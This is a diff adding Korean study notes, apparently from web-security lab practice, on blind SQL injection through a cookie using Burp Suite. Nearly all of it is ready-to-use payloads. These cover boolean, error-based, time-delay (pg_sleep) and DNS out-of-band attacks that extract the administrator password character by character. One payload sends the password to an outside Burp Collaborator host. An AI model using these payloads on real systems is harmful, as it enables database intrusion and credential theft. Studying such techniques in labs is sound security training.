@@ -1,0 +1,100 @@
+[Burp Suite을 사용하여 쿠키 수정 후 비번 검색]
+1.버프 슈트 Proxy로 들어간 후 Intercept is on을 해준다.
+2.웹 브라우저로 들어가 proxy를 키고 페이지 로딩을 한다.
+3.Action에서 Send to Repeater를 눌러 Pepeater로 넘겨준다
+4.쿠키의 값을 변경한다.
+
+[쿠키 값 변경]
+{
+    Cookie=x'+OR+1=1--
+    -환영합니다(O)-
+
+    Cookie=x'+OR+1=2--
+    -환영합니다(X)- >>환영합니다라는 문구가 뜨지 않는 것을 확인
+
+    x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
+    > username이 administrator인 사용자가 있는지 확인
+
+    x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
+    > 비밀번호의 길이를 확인하려는 조건, 이 경우가 참인지를 확인하고 참일 경우 숫자를 올림
+
+    x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>20--
+    > 거짓이 나올경우 넣은 숫자가 비밀번호의 길이다.
+
+    5.쿠키의 값을 변경을 다 했고 비밀번호의 길이를 알았으면
+    Action에서 Send to Intruder를 눌러 Intruder로 넘겨준다.
+    6.Intruder에서 Clear §을 눌러주고 Cookie의 내용을 다음과 같이 바꿔준다.
+
+    x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--
+    > substring을 이용해 단일 문자를 추출하고 특정 값으로 테스트한다.
+    테스트를 위해 다음과 같이 §를 추가해 준다.
+
+    x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,§1§,1)='§a§'--
+}
+>>>조건부 응답이 있는 경우
+
+{
+    '+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
+    > 오류 메세지 확인
+
+    '+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual--
+    > 오류 메세지가 없어 지는지 확인
+
+    '+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+    > administrator라는 사용자가 있는지 확인
+
+    '+UNION+SELECT+CASE+WHEN+(username='administrator+AND+length(password)>1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+    > password의 길이 확인
+
+    '+UNION+SELECT+CASE+WHEN+(username='administrator+AND+length(password)>20)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+    > 조건이 거짓일 경우 오류가 안뜸 = password의 길이
+
+    5.쿠키의 값을 변경을 다 했고 비밀번호의 길이를 알았으면
+    Action에서 Send to Intruder를 눌러 Intruder로 넘겨준다.
+    6.Intruder에서 Clear §을 눌러주고 Cookie의 내용을 다음과 같이 바꿔준다.
+
+    '+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,1,1)='a')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+    > substring을 이용해 단일 문자를 추출하고 특정 값으로 테스트한다.
+    테스트를 위해 다음과 같이 §를 추가해 준다.
+    '+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,§1§,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
+}
+>>조건부 오류가 있는 경우
+
+7.Attack type을 Cluster bomb으로 바꿔 준다.
+8.Payloads탭으로 넘어가 Payload set 1의 Simple list를 0에서 아까 구한 비밀번호의 길이까지를 추가한다.
+9.Payload set 2의 Simple list는 넣어주는 값으로 Add from list에서 a-z와 0-9를 추가해 준다.
+10.이제 Start attack을 누르고 반응 값이 다른것들을 찾은 후에 Payload set 1의 순서대로 비밀번호를 메모한다.
+11.알아낸 비밀번호로 로그인
+
+[시간 지연을 이용한 블라인드 인젝션]
+
+x'||pg_sleep(10)-- 조건이 참일때 10초 쉰다
+
+x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+>>시간 지연을 통한 injection이 통하는지 확인
+
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+>>비밀번호 자릿수 찾기
+
+x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+>>버프슈트에 돌림(colums뭐시기에서 시간 많은거 위주로 거름)
+
+
+[DNS를 이용한 블라인드 인젝션]
+
+x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+>>여기까지는 대충 넘어간다.
+
+Burp Collaborator client를 키고
+평소처럼 뺏어온다 
+
+x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'./">+%25remote%3b]>'),'/l')+FROM+dual--
+>>이걸 넣어주고 값이 제대로 나오는지 확인한 후 Burp Collaborator client에서 클립보드에 복사한다.
+
+x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+>>복사한 값을 붙여 넣고 다시 Burp Collaborator client로 가서 Poll now를 눌러준다
+>>나온 값들 중 타입이 HTTP인것을 찾고 리퀘스트의 호스트 부분을 보면 비밀번호가 나와있다.
+
